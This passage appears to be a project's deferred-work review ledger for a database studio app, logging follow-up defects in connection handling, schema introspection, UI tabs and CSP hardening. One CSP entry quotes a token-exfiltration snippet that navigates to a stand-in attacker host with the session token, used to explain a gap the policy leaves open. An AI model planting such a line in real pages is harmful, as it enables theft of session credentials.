  summary: `StoredUrlLookup` is declared twice — once in `connection-registry.ts` and once in `connection-targets.ts` — and the two are coupled only by structural duck-typing, so a field added to one and not the other disappears at the seam with no compile error.
  evidence: `src/core/connection-registry.ts:61` and `src/core/connection-targets.ts:52` both declare the type; pre-existing (both declarations exist at baseline `6fb93df`), but Story 10.2 had to widen BOTH by hand and its own Code Map carried the warning "declared a second time here — widen it too or the field never arrives", which is the smell itself. Nothing in the build forces the pair: `getStoredUrl`'s extra keys are simply dropped by the consumer's narrower type. Flagged by Blind Hunter. Follow-up candidate: have `connection-targets.ts` import the registry's type (or add a `satisfies` cross-check) so the next field cannot silently vanish. No known live defect — the two are in sync today.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-2-per-connection-schema-scope.md`
  summary: The Settings edit form always sends `name`, so saving a row rendered from a stale list silently overwrites a rename made out-of-band (second window / second Studio on the same app dir) — the exact lost-update that Story 10.2 deliberately closed for `schema`, still open for `name`.
  evidence: `src/ui/settings/connections-model.ts` `editConnectionParams` emits `name: draft.name.trim()` unconditionally while `schema` is emitted only when it differs from the stored value; `SettingsPanel.tsx:243` lists once on mount and never refreshes, so a row can be arbitrarily stale by save time. Pre-existing since the edit form landed (Story 2.4-era) — Story 10.2 did not introduce it, it only made the asymmetry visible by fixing the neighbouring field. Flagged by Edge Case Hunter. Follow-up candidate: give `name` the same omit-when-unchanged rule (`storedName` is already on the summary), which also lets a name-only no-op save hit the registry's empty-patch fast path. Low frequency (needs two concurrent editors), silent when it happens.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-3-privileged-introspection-align.md`
  summary: A UNIQUE index spanning a visible and an invisible column now folds into a unique index over the visible columns only, so the tree asserts a uniqueness constraint that is false over the real schema — the partial row is less information AND wrong information.
  evidence: `src/core/driver.ts` `assembleSchema` groups index rows by `indexName` and pushes columns in arrival order, so with a column-level `SELECT` grant on `a` and a UNIQUE index on `(a, b)`, the `b` row is now filtered out in-query and the index folds as unique over `(a)`; `src/ui/data/IndexList.tsx:55-65` renders that with the `⚿` glyph and a bare "unique" label, no qualifier. Flagged by both reviewers. NOT a spec deviation: Story 10.3's contract matrix explicitly blesses the partial row ("Index row surfaces with ONLY the visible column(s)"), and the behavior mirrors what `information_schema` itself does (it hides columns without telling you). What was never decided is the `unique` FLAG's semantics on a truncated column list. Follow-up candidate: either drop the whole index when any of its columns is invisible (an in-query `NOT EXISTS (SELECT 1 FROM unnest(ix.indkey) …)` guard), or keep the partial row and mark it as restricted in the UI. Needs a product call, not a patch — column-level grants are uncommon, but when present the display is affirmatively incorrect.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-3-privileged-introspection-align.md`
  summary: The FK introspection query has the same privilege gap the index query just closed — it reads `pg_constraint`/`pg_attribute` raw, so a restricted Postgres role still receives FK column names for columns outside its grants.
  evidence: `src/core/driver-postgres.ts` FK query (the `contype = 'f'` block) joins `pg_attribute att`/`ref_att` with no `has_column_privilege`/`pg_has_role` predicate, exactly as the index query did before this story. Confirmed real by both reviewers and by the spec's own Design Notes (follow-up candidate #2). Explicitly out of Story 10.3's scope — its epic AC scopes the alignment to the index queries and its contract's Never list forbids widening the FK query in this pass. This pass left a `KNOWN GAP, deliberate` comment at that query so the asymmetry does not read as an oversight. Follow-up candidate: apply the same `pgIndexColumnVisibility`-style predicate to the FK query's local (and possibly referenced) side. Same severity class as the gap 10.3 just closed.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-3-privileged-introspection-align.md`
  summary: There is no fixture anywhere — automated or manual — that exercises a restricted Postgres role, so a change to privilege-boundary behavior shipped without ever having been run against the scenario that motivates it.
  evidence: `docker/seed.sql` contains no `CREATE ROLE`, no `GRANT`, no `REVOKE`, so the docker stack (`docs/docker-development.md`, the project's only manual dev-eyeball path) boots a single superuser and cannot show the difference this story makes; the automated suite is deliberately live-DB-free per the spec's own Always list, and locks the predicate's text plus its splice, not its runtime effect. Flagged by Blind Hunter. Follow-up candidate: add a restricted role plus a column-level grant to the seed (~4 lines) so the partial-visibility case is reproducible by hand — this is dev-environment surface shared by everyone, so it deserves its own decision rather than being bolted onto a driver story. No known live defect; this is a verifiability gap.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-3-privileged-introspection-align.md`
  summary: For an existing restricted role (monitoring/read-only), index metadata that used to render now silently disappears, and the tree gives "this table has no indexes" and "your role may not see this table's indexes" the same appearance.
  evidence: The new predicate changes what `listSchema` returns for any already-saved connection whose role lacks table-level privileges — correct on the privacy axis, but `src/ui/data/IndexList.tsx` renders an empty index list with no notion of a restricted view, and nothing in the tree or the connection root signals it. Flagged by Blind Hunter. Follow-up candidate for the Epic 10 tree work (Story 10.5 owns per-root state rendering): surface a "restricted view" affordance on a connection whose role is not the owner, so absence-by-privilege is distinguishable from absence-in-fact. Low frequency, but silently misleading when it hits.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-4-core-resolve-by-connection-id.md`
  summary: After a schema-mutating statement busts the memo, a transient introspection failure turns a read that previously succeeded into a hard error — there is no fallback to the last-known-good schema.
  evidence: `src/core/connection.ts` `getSchema` now awaits `refreshIfStale(d)` before reading the memo, so a `listSchema` that hits the DW-19/DW-20 timeout propagates: `table.rows` answers `internal_error` (the `NoConnectionTargetError` catch at `server.ts` does not cover it) and chat answers `bad_request "no active connection"` — telling the user their connection is gone while a live one is open, in the one error class a client will not retry. Before this story the same request served the memo and succeeded. `cached` still holds a usable schema at that moment and nothing serves it. Flagged by Blind Hunter. NOT a spec deviation: the spec deliberately chose "propagate, leave the flag set, next read retries" so a knowingly-stale memo is never served silently. Follow-up candidate: decide whether a failed refresh should serve the last-known-good catalog with a staleness marker, which needs a contract addition (there is no way to say "this schema may be stale" on the wire) rather than a patch.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-4-core-resolve-by-connection-id.md`
  summary: Two connection ids (or the boot url and a saved id) that address the SAME database each hold their own manager and their own memo, so a DDL through one leaves the other serving a stale catalog.
  evidence: `src/core/connection-targets.ts` keys the pool by connection id and `seams.invalidateSchema()` reaches exactly one manager, by design — the spec's folded DW-45 constraint is explicit: "Keep it SCOPED to the affected target — do not flush every target's cache." So a Report that creates a table through a saved target leaves the boot-manager tree and chat (which the UI still uses for everything) showing the pre-DDL catalog. Flagged by Edge Case Hunter. Fixing it means invalidating every cached manager whose stored url matches the mutated one, which directly contradicts the scoping constraint and needs url comparison the seams deliberately do not expose. Follow-up candidate: decide whether the pool should dedupe/alias managers by url instead of by id, which is a pool-identity decision, not a patch.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-4-core-resolve-by-connection-id.md`
  summary: A `runQuery` that throws AFTER the engine partially applied a DDL leaves the memo stale, because invalidation only fires on the success path.
  evidence: `src/core/executor.ts` calls `seams.invalidateSchema()` after a successful `runQuery` on the confirmed-raw branch and after a successful `createTable`; a throw skips it. MySQL DDL is non-transactional, so a single statement such as `DROP TABLE a, b` can drop `a` and then fail on `b` — the catalog changed, the memo did not. Flagged by Edge Case Hunter. Deliberately NOT patched: the spec's task text mandates "only AFTER a successful run (a throw skips it)" and a new test asserts "a throwing runQuery → never invalidates", so moving the call into a `finally` is a spec-level decision, not a silent code fix. Follow-up candidate: flip the rule to invalidate in a `finally` — it is strictly safer under the spec's own stated principle that under-invalidating re-serves a stale schema while over-invalidating costs one extra introspection.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-4-core-resolve-by-connection-id.md`
  summary: `connect` is now targetable but `connection.active` is still boot-only, so the same RPC surface can describe two different connections with nothing in the contract warning the consumer.
  evidence: `src/core/server.ts` leaves `activeConnection: () => ({ mode, connection: connectionManager.describe() })` bound to the boot manager while `connect(params)` resolves by id. A UI that calls `connect({connectionId:"conn-b"})`, renders the tree from that catalog, and then calls `connection.active` for the status bar shows the BOOT host/database. Flagged by Blind Hunter. Explicitly out of Story 10.4's scope (the spec's Design Notes name it), but neither doc comment warns the 10.5/10.6 consumer. Follow-up candidate for Story 10.5/10.6, which own the per-root and per-tab connection identity: make the active-connection descriptor resolve by id too, or at minimum document the asymmetry at both declarations.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-4-core-resolve-by-connection-id.md`
  summary: `table.rows` runs its COUNT/SELECT through `runQuery` (read-write) rather than `runReadOnly`, and as of this story that applies to any saved production connection, not just the boot one.
  evidence: `src/core/server.ts` `tableRows` calls `seams.runQuery(plan.countSql, [])` / `seams.runQuery(plan.selectSql, [])`. Behavior-preserving (the pre-10.4 code called `connectionManager.query`), so NOT a regression — but the seam set offers `runReadOnly`, and the executor's own auto-classified read branch deliberately wraps reads in an engine read-only transaction so a hidden write "fails at the engine, never commits". A browsed relation backed by a volatile or writing function is therefore rolled back on the `execute` path and committed on the `table.rows` path. Flagged by Blind Hunter. Follow-up candidate: switch the browse path to `runReadOnly` — a semantic change with real regression risk (some engines reject constructs inside a read-only transaction), so it wants its own story and its own test pass.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-4-core-resolve-by-connection-id.md`
  summary: A connection removed or repointed in Settings between `resolve` and the awaited read surfaces as `internal_error` instead of the typed `not_found`, because the resolved seams are already bound to a manager the eviction just closed.
  evidence: `src/core/connection-targets.ts` `evict()` fire-and-forget closes the cached manager; a `table.rows`/`connect`/`execute` that resolved a moment earlier then hits `ensureDriver`'s "connection is unavailable (shutting down)" Error, which is not `NoConnectionTargetError`, so it propagates to dispatch's catch-all as `internal_error`. Flagged by Edge Case Hunter. Pre-existing for `execute` since Story 6.2; this story widened it to `table.rows`, `connect` and chat. Narrow race (needs a Settings edit concurrent with an in-flight read). Follow-up candidate: catch the closed-manager error at the read sites and either re-resolve once or map it to `targetError("not-found")`, which needs a policy call on whether a mid-flight repoint should transparently retry.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-4-core-resolve-by-connection-id.md`
  summary: The per-target connection pool has no bound, no LRU and no idle eviction — it keeps one open manager per resolved `connectionId` until `closeAll()`, and this story widened its feeders from one RPC to four.
  evidence: `src/core/connection-targets.ts` caches a `ConnectionManager` per id and only ever drops one on registry invalidation or `closeAll()`; before this story only the Reports executor fed it, whereas `table.rows`, `connect` and chat now all resolve through it (`src/core/server.ts`). Flagged by Blind Hunter. Not reachable today — the UI still sends no `connectionId`, so only the boot manager is ever resolved — but it becomes reachable the moment Stories 10.5/10.6 make the tree and tabs connection-aware: browsing N saved connections then leaves N live database connections open for the whole session, with nothing to reclaim them. NOT a defect in this change and NOT a spec deviation: the pool's lifecycle is Story 6.2's, and 10.4's contract mandates reusing it as-is. Follow-up candidate, and it pairs naturally with 10.5: give the pool an idle TTL or an LRU cap with a close-on-evict, which needs a policy call (how long is a connection idle before reclaiming it is user-visible latency) rather than a patch.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-4-core-resolve-by-connection-id.md`
  summary: During shutdown the same cause produces two contradictory answers: a targeted `connect` reports 404 "no connection with that id" (which is false — the connection exists), while the untargeted one reports a 200 neutral `{status:"failed"}` "connection is unavailable".
  evidence: `src/core/connection-targets.ts` latches closed in `closeAll()` and answers every subsequent `resolve(id)` with `not-found`, which `targetError` maps to `errorReply("not_found", "no connection with that id")`; `resolve(null)` instead returns the boot seams, whose `connect()` answers the neutral shutdown payload (`src/core/connection.ts`). Flagged by Blind Hunter. Pre-existing in the pool since Story 6.2 and deliberately reused verbatim by this story (its I/O matrix blesses the shutdown race as "typed `not_found`"); what was never decided is that the message then MISDESCRIBES the cause to a client that will reasonably drop the connection from its list. Narrow window (a request racing `stop()`), and the process is going away anyway. Follow-up candidate: give the resolver a third reason (`shutting-down`) so the latch can map to the same neutral "unavailable" answer the default path gives, instead of borrowing `not-found`.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-5-multi-root-schema-tree.md`
  summary: Nothing can re-introspect a root that is already `ready`, so editing a saved connection's url/credentials in Settings leaves its tree root showing the OLD database's catalog until the app is restarted.
  evidence: `shouldFetchOnExpand` (`src/ui/schema/schema-tree-state.ts`) returns true only for `idle`, and "Reintentar" is rendered only in `ConnectionRoot`'s `error` branch, so collapse→re-expand and the registry refresh both re-show the cached catalog. The IG-A ruling in `<intent-contract>` is explicit and unconditional — "a root that is already `loading`/`ready`/`error` and still present KEEPS its cached state ... a refresh must never re-introspect" — and its trigger list names `edited`, so the code is spec-compliant; what the ruling did not consider is that an EDIT can repoint the same id at a different database. The Core does the right thing (`connection-targets.ts` compares `lookup.url` and evicts the manager), the UI never learns. Flagged by both Blind Hunter and Edge Case Hunter. NOT patched: any fix contradicts a frozen human ruling. Follow-up candidate: let `onRegistryChanged` carry the mutated id so an EDITED root's cache alone is invalidated back to `idle`, or add an explicit refresh affordance to a `ready` root — either way it is a decision for the human who made the IG-A ruling, not a dev-session patch.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-5-multi-root-schema-tree.md`
  summary: A tab opened from a saved-connection root is silently read-only — inline edit, row delete AND the add-row affordance all disappear, with no UI explanation of why.
  evidence: `src/ui/App.tsx` makes `primaryKeys`/`indexes` bail on a non-null `ref.connectionId` (correct — `allTables` describes the boot target only, and borrowing a same-named boot table's PK would aim a WRITE at another database), so `TabContent.tsx`'s `canMutate = primaryKeys.length === 1` is false and the grid degrades with no affordance or message. Directly mandated by the TARGETED ACTIVATION ruling, and the spec's own Design Notes name the real fix ("making the other consumers connection-aware is Story 10.6's job"). Flagged by Blind Hunter. Follow-up candidate for Story 10.6: give each connection root its own catalog so a saved-connection tab regains PK-addressed mutation; until then, consider a one-line "solo lectura — sin catálogo para esta conexión" hint so the degradation is legible rather than mysterious.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-5-multi-root-schema-tree.md`
  summary: The story's central data-safety guarantees live in React effects and inline closures that this repo's test harness structurally cannot reach, so the mount RPC contract, the laziness promise and the connection-scoping of reads/writes all ship unexercised.
  evidence: The repo has no jsdom/testing-library and asserts components with `renderToStaticMarkup`, which never runs `useEffect` (`src/ui/workspace/ChatTabView.test.tsx`). The 38 new tests therefore cover pure functions (`schema-tree-state.ts`) and static markup (`ConnectionRoot`) only; untested are the "exactly THREE RPCs at mount" contract, "no `connect` until a saved root is expanded" (the story's headline promise), the registry-refresh path end-to-end, `SettingsPanel` actually firing `onRegistryChanged`, `App.onSchemaLoaded`'s boot-only gate, the `primaryKeys`/`indexes` bail, and `connectionScope` reaching `table.rows`/`execute`. The spec's own "closest render-level proxy for no handshake storm" (`expect(rpcMock).toHaveBeenCalledTimes(0)` during a static render) is vacuous — it holds for any effect-free render, including a hypothetical 20-handshake implementation. Flagged by Blind Hunter. Follow-up candidate: adopt a DOM test harness (happy-dom is a one-line Bun preload) or extract the remaining decision closures into pure helpers — a repo-wide testing-infrastructure decision, not a story patch.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-5-multi-root-schema-tree.md`
  summary: Query, chat and create-table still execute against the boot target no matter which connection root the user is browsing, so the tree now shows N databases while every non-table surface silently addresses one.
  evidence: Story 10.5's TARGETED ACTIVATION ruling binds "the tab bound by that activation" — `TabContent.tsx`'s `TableTabView` — and its `connectionScope` reaches `table.rows` and the structured-mutation `execute` only. `QueryTabView`'s raw `execute`, `CreateTablePanel`'s DDL and the chat RPCs send no `connectionId`. Not a regression (none of those surfaces ever had a connection binding) and explicitly outside the ruling's stated scope, but the multi-root tree is what makes the mismatch reachable and confusing. Flagged by Edge Case Hunter and by the implementation session itself. Follow-up candidate for Story 10.6: each of those surfaces needs its own connection binding (a picker, or inheritance from the focused root) — a UX decision, not a patch.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-5-multi-root-schema-tree.md`
  summary: The multi-root tree is keyboard-operable but has no ARIA tree semantics and no arrow-key navigation, so reaching a deep table costs one Tab per preceding row.
  evidence: Root headers, schema nodes and table rows are all `div role="button"` inside plain `ul`/`li` — no `role="tree"`/`treeitem"`/`group`, no `aria-level`/`aria-setsize`/`aria-posinset`, no roving tabindex. Every row is its own tab stop, so a root with 400 tables costs 400 Tabs to traverse; `aria-pressed` (selection) and `aria-expanded` (disclosure) also coexist on the same table row. Related: the "Reintentar" button unmounts on a successful retry and drops focus to `<body>`, and `introspecting…` is a plain `<p>` rather than a live region, so a screen-reader user gets no signal that introspection finished. Flagged by Blind Hunter. Pre-existing in shape (the single-root tree had the same flat `role="button"` rows) but materially worse now that the tree is N roots deep. Follow-up candidate: a dedicated a11y pass over the tree — proper tree roles plus roving-tabindex arrow navigation is a self-contained piece of work with its own test surface.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-5-multi-root-schema-tree.md`
  summary: The boot root's introspection is gated behind `connections.list`, so a slow credential store delays `App.tsx`'s `schemaTables` (ERD, create-table schema selector, PK resolution) by up to the 10s RPC timeout — latency the pre-10.5 tree did not have.
  evidence: `src/ui/schema/SchemaTree.tsx`'s tree read issues `Promise.all([rpc("connection.active"), rpc("connections.list")])` and only reaches the boot root's own `connect` after BOTH settle. The two are not symmetric: `connection.active` is a pure in-memory read, while `connections.list` lazily opens the encrypted credential store (keyring or passphrase path, Stories 2.1-2.3) and is the one that can stall. Before this story the tree fired its `connect` unconditionally at mount, so nothing about the registry could delay the boot catalog. `src/ui/rpc/client.ts` caps the wait at its 10s `AbortController` timeout, so the worst case is bounded but long, and an ephemeral session — which never uses the registry at all — is exactly the case that pays for it. Flagged by Edge Case Hunter. NOT patched: settling the two reads independently means the boot root can introspect before the root LIST exists, which changes the phase machine's shape (a `roots` phase built from one reply, reconciled by the other) rather than moving a line. Follow-up candidate: start the boot root's `connect` off `connection.active` alone and let `connections.list` fill in the saved roots when it lands.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-5-multi-root-schema-tree.md`
  summary: Nothing on a table tab says WHICH connection it reads from, so two tabs opened from different roots for the same table name are indistinguishable in the tab bar — in the story whose whole point is that they are different tables.
  evidence: `src/ui/workspace/workspace-state.ts`'s `TableRef` gained `connectionId`, and `TabContent.tsx` keys the view by `${connectionId}::${schema}.${name}` so the two tabs really are separate mounts with separate rows — but the tab title is still the bare table name and no root name reaches the tab at all (`TableRef` carries the id, never the `ConnectionSummary.name`). Open `public.orders` from the boot root and from a saved `analytics` root and the tab bar shows `orders` twice, with different data behind each and no way to tell which is which; the same ambiguity hits the status bar and the ERD entry points. Flagged by Blind Hunter. NOT patched: the fix needs the connection NAME (not the id) to reach the tab, which means either threading `ConnectionSummary` through the activation callback or resolving it in the shell — a prop-shape decision that lands naturally with Story 10.6's per-tab connection identity work. Follow-up candidate: carry the root's display name into the tab title or a per-tab badge.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-5-multi-root-schema-tree.md`
  summary: DW-41's clearing filter cannot retire an optimistic table that was created into the DEFAULT namespace, because it compares `schema.name` keys and such an entry carries a blank schema the introspection resolves to a real name.
  evidence: `src/ui/App.tsx`'s `onSchemaLoaded` filters `createdTables` with `introspected.has(`${t.schema}.${t.name}`)`, while an optimistic entry created without an explicit schema carries `schema: ""` (the same case `App.tsx`'s `schemas` memo skips and `TabContent.tsx`'s `effectiveSchema` maps to `undefined` so the Core resolves the default). A fresh introspection reports that table as `public.drafts`; the optimistic entry is keyed `.drafts`; the keys never match, so the entry survives as a permanent phantom duplicate alongside its own real row. Currently latent rather than visible, because DW-41's clearing half is itself `open (partial)` — no path re-introspects a `ready` boot root — but it is written into the filter that will run once that path exists. Flagged by Edge Case Hunter. NOT patched: matching a blank schema by table NAME alone is a heuristic (it would also retire a genuinely different table of the same name in another schema), so it wants deciding alongside the rest of DW-41 rather than in isolation. Follow-up candidate: resolve the optimistic entry's schema at creation time from the Core's reply instead of storing a blank.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-5-multi-root-schema-tree.md`
  summary: Namespaced tree keys are built by unescaped string concatenation, so a schema or table identifier containing a dot collides with a different, legally-named pair — expanding one table then discloses another's columns.
  evidence: `src/ui/schema/schema-tree-state.ts`'s `tableKey(root, schema, table)` returns `` `${root}::${schema}.${table}` `` and `mergeTables` dedupes on `` `${t.schema}.${t.name}` ``, neither escaping the separator. Postgres and MySQL both allow a dot inside a quoted identifier, so schema `public.v2` + table `orders` and schema `public` + table `v2.orders` produce the identical key: they share one `expandedTables` entry and one React list key (duplicate-key warning, wrong disclosure), and `mergeTables` treats them as the same table so an optimistic entry can silently shadow a real one. Flagged by both Blind Hunter and Edge Case Hunter. The dedupe key is pre-existing (it was already the merge key in the single-root tree); what this story added is its extension into the expansion Sets and React keys. NOT patched: the fix is a key-encoding change (length-prefixed or `JSON.stringify([root, schema, table])`) that touches the module's whole key surface plus every test that spells a key literally, and the trigger needs a deliberately-quoted dotted identifier. Follow-up candidate: switch the three key builders and the merge key to an unambiguous encoding in one pass.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-5-multi-root-schema-tree.md`
  summary: The single-schema auto-expand convenience is computed from the introspected tables alone, so it disagrees with what is actually rendered whenever an optimistically-created table supplies the only schema group.
  evidence: `src/ui/schema/SchemaTree.tsx`'s `loadRoot` calls `autoExpandKeys(descriptor.key, groupBySchema(next.schema.tables))` on the RAW reply, while `ConnectionRoot` groups `mergeTables(state.schema.tables, extraTables)` for the boot root. An empty database therefore introspects to zero groups (no auto-expand), and a table created afterwards renders as a single collapsed schema node that the "a single-schema root auto-expands" rule was written to open. Flagged by both Blind Hunter and Edge Case Hunter. Consequence is one extra click in the empty-database case, and it is currently near-unreachable besides: auto-expand only runs on a `ready` TRANSITION, and no path re-introspects a `ready` root (DW-41's other half). NOT patched: `loadRoot` is reached from the mount effect's deliberately-frozen first-render closure, so reading `extraTables` there would capture the mount-time value and trade a cosmetic skew for a stale one. Follow-up candidate: fold it into the DW-41 work, where the created-table lifecycle is decided as a whole.

### DW-69: Follow-up review still recommended for 10-5-multi-root-schema-tree after the review budget was exhausted
origin: review-budget-followup
source_spec: `spec-10-5-multi-root-schema-tree.md`
severity: low
reason: Review budget (3 cycles) was exhausted with the story finalized (status: done, verify green) while the review pass kept recommending an independent follow-up. The work was committed by bmad-loop run 20260722-141217-22a8; this entry preserves the lingering follow-up recommendation for a deliberate later review.
resolution: Follow-up adversarial review performed 2026-07-23 (3 rounds x 2 independent blind judges, out-of-loop session). Found and FIXED 6 confirmed defects in commit 4a49b52 — headline: a wrong-database READ/WRITE via a repointed connection that all three prior in-loop review passes missed (and whose false "read-only" premise had propagated into this ledger). 3 residuals escalated to DW-72/DW-73/DW-74. Verify: tsc clean, bun test 1567 pass / 0 fail (+3 new tests).
status: done 2026-07-23

### DW-70: Query and chat tabs still execute against the boot target regardless of which connection root the user is browsing — neither can ACQUIRE a `connectionId` today
origin: implementation of spec-10-6-tabs-carry-connection.md, 2026-07-22
source_spec: `spec-10-6-tabs-carry-connection.md`
location: `src/ui/workspace/QueryTabView.tsx` (`runRawQuery(sql)` / `runRawQuery(pendingSql, true)` call sites), `src/ui/workspace/ChatTabView.tsx` (no `connectionId` anywhere), `src/ui/workspace/workspace-state.ts` (`bindTableToActiveTab` is the only writer of `WorkspaceTab.connectionId`)
severity: low
reason: Epic 10's Story-10.6 AC text says "a table/query tab" carries a `connectionId`, but the authoritative solution point and the only per-tab connection-scoped ref type (`TableRef`) cover TABLE tabs only. `QueryTabView` calls `runRawQuery(sql)` with no id (the third `connectionId` parameter exists on `run-raw-query.ts` since Story 6.2 but is never passed here) and `ChatTabView` has no `connectionId` at all, so neither tab kind can acquire one: the schema tree only ever activates *tables*, and there is no per-tab target picker outside Report tabs' own Story-6.2 mechanism (report tabs are therefore NOT part of this gap). Persisting a field nothing can populate would be dead weight, so 10.6 wired table tabs only — while keeping `WorkspaceTab.connectionId` and `WorkspaceSnapshotTab.connectionId` generic over tab kind precisely so the follow-up is purely ADDITIVE: it needs a per-tab target picker (or a "new query against this connection" tree affordance) plus the `connectionId` pass-through at the two `runRawQuery` call sites and in the chat stream request — not a schema change, not a snapshot-version bump, and not a change to the save/load boundaries.
status: open

- source_spec: `spec-10-6-tabs-carry-connection.md`
  summary: A restored tab whose `connectionId` still RESOLVES surfaces that fact nowhere — the persisted id is read only by the missing-connection check, so the story's headline value ("reopen this tab against the right database") is observable only in the failure case.
  evidence: `WorkspaceTab.connectionId` has exactly two readers (`isTabConnectionMissing` and the `ConnectionUnavailable` swap in `TabContent.tsx`). A tab restored with a live id renders the ordinary `SelectTablePrompt` with no connection name in the body, the tab strip or the status bar, and every RPC still keys off the session-only `tab.table.connectionId`. The 10.5 review already logged the same gap ("same-named tables from different connections are indistinguishable"); a per-tab connection indicator is the remedy and is out of 10.6's frozen scope.

- source_spec: `spec-10-6-tabs-carry-connection.md`
  summary: Editing a saved connection's URL in Settings keeps its id live, so a tab bound to that id silently starts reading (and writing) the OLD table name against the NEW database, with no reconciliation and no warning.
  evidence: The registry invalidates the multi-target pool per id, so the next `table.rows`/`execute` from that tab resolves the edited URL while `tab.table` still holds the previous database's `schema.name`. `registryRevision` bumps on the edit but only drives root reconciliation in the tree and the live-id set here — neither clears a bound `table`. Pre-existing since 10.4/10.5 (this story only made the id survive a restart); the fix is a per-connection revision that clears bound refs whose connection's target changed.

- source_spec: `spec-10-6-tabs-carry-connection.md`
  summary: `connections.list` now has three independent owners with no shared cache (`Workspace`, `SchemaTree`, `ReportTabView`), and the two `registryRevision`-keyed copies can silently disagree.
  evidence: `Workspace.tsx` and `SchemaTree.tsx` fire the same RPC on mount and on every registry mutation; if Workspace's read fails while the tree's succeeds, the tree shows every root while `connections` stays `null` and NO tab is ever flagged unavailable — with no signal that the check is off. `SchemaTree` already retains its last successful list and could be the single source, or the fetch could be hoisted once and passed to both.

- source_spec: `spec-10-6-tabs-carry-connection.md`
  summary: A background tab whose connection was removed is invisible until it is activated, and on relaunch an affected tab briefly renders "select a table" before flipping to "conexión no disponible".
  evidence: `TabContent` only ever receives the ACTIVE tab, so the strip (`TabBar.tsx`) gives no hint that other tabs are broken — the AC's "siblings untouched" is satisfied literally while leaving the user to discover the problem by clicking. The flash comes from `connections` starting `null` ("unknown set ⇒ never flag", deliberate) with no pending state between the workspace restore and the `connections.list` reply.

- source_spec: `spec-10-6-tabs-carry-connection.md`
  summary: `src/core/workspace-store.test.ts` contains NUL bytes, so git classifies it as binary and every diff of it reads `Bin N -> M bytes` — its changes are invisible to any diff-based review.
  evidence: Pre-existing at `4ad9393` (not introduced by this story). Confirmed with `file` (reports `data`, not `JavaScript source`) while its sibling `workspace-registry.test.ts` reports `UTF-8 text`. This review had to reconstruct the file's 10.6 additions by hand; a reviewer taking the diff at face value would have reviewed the story with one of its four test files entirely dark.

- source_spec: `_bmad-output/implementation-artifacts/spec-dw-2-csp-app-shell-hardening.md`
  summary: A stored-XSS in rendered DB content can still exfiltrate the per-boot session token via scripted top-level navigation (`location.href = "https://evil.tld/?t=" + window.__QS_TOKEN__`), which the new app-shell CSP does not block.
  evidence: `connect-src 'self'` closes only fetch/XHR/WebSocket/EventSource. The `navigate-to` directive that would have covered scripted navigation was removed from CSP and ships in no browser, and `form-action` does not apply to scripted navigation. This is the app-shell twin of the residual already accepted for the Ring 3 sandbox in DW-47; unlike DW-47 it has never been recorded or decided for the shell. Surfaced by the first DW-2 review pass (2026-07-22), which was instructed not to write to this ledger and recorded it in the spec's Review Triage Log instead; filed here by the follow-up review pass so it is not lost. Closing it is a deliberate decision (accept-and-document, as with DW-47, or a real mitigation such as not exposing the token to script at all), not an unattended patch.

- source_spec: `_bmad-output/implementation-artifacts/spec-dw-2-csp-app-shell-hardening.md`
  summary: The app-shell CSP's compatibility with the live UI rests entirely on a prose inventory of what Ring 2 loads; nothing re-verifies that inventory, so a dependency that adds a Worker, a wasm decoder, an `@font-face`, or a remote fetch would white-screen or silently degrade the app with a fully green test suite.
  evidence: `SHELL_CSP_RESOURCE_DIRECTIVES` and `SHELL_CSP_TRAILING_DIRECTIVES` in `src/core/server.ts` justify `worker-src 'none'`, `object-src 'none'`, `form-action 'none'`, `font-src 'self'`, `img-src 'self' data:` and the absence of `'unsafe-eval'` with claims like "verified zero `new Worker`" and "zero `@font-face` in the built CSS". Both review agents independently re-ran that grep against `src/core/ui-bundle.generated.ts` and confirmed the inventory is accurate TODAY (0 `new Worker`/`SharedWorker`, 0 `WebAssembly`, 0 `eval(`, 0 `new Function(` outside decimal.js-light's unreachable UMD footer, 0 `@font-face`, no remote asset URLs) — but no test asserts any of it, and there is no headless-browser harness in the repo, so nothing keeps it accurate. The gap is mechanically closable without a browser: a test that greps the four `*-bundle.generated.ts` artifacts for the constructs each `'none'` directive claims are absent would fail on the dependency bump that introduces one, which is exactly the moment the policy needs re-deriving. Not patched here because it is a new test surface over build artifacts (which are gitignored and rebuilt by `bun run build`), with its own decisions about scope and false-positive tolerance.

- source_spec: `_bmad-output/implementation-artifacts/spec-dw-2-csp-app-shell-hardening.md`
  summary: The app shell is now the ONLY token-bearing page with a strict CSP — `/live/<id>` still serves the same per-boot session token under `script-src 'unsafe-inline'`, so an injection there executes with the exact ambient authority DW-2 just closed on the shell.
  evidence: `LIVE_REPORT_CSP` (`src/shared/live-report-html.ts:28`) is `default-src 'none'; connect-src 'self'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; frame-ancestors 'none'`, and the route at `src/core/server.ts` injects the session token into that page (mirroring `renderIndexHtml`) so the inlined runtime can re-query `/rpc`. `connect-src 'self'` there means a script CAN reach `/rpc` with the token it can read. Explicitly OUT of DW-2's scope by its own intent contract ("Do NOT change `liveHtmlHeaders`, `LIVE_REPORT_CSP` … AD-3 pins the Ring 3 policy"), so this is a deliberate non-patch, not an oversight. Closing it is the same shape of work DW-2 just did for the shell — a per-boot nonce on the Live Report's inline script instead of `'unsafe-inline'` — but it lands on a page assembled as a self-contained document, so it needs its own decision about the exported-vs-served split before any code moves.

- source_spec: `_bmad-output/implementation-artifacts/spec-dw-2-csp-app-shell-hardening.md`
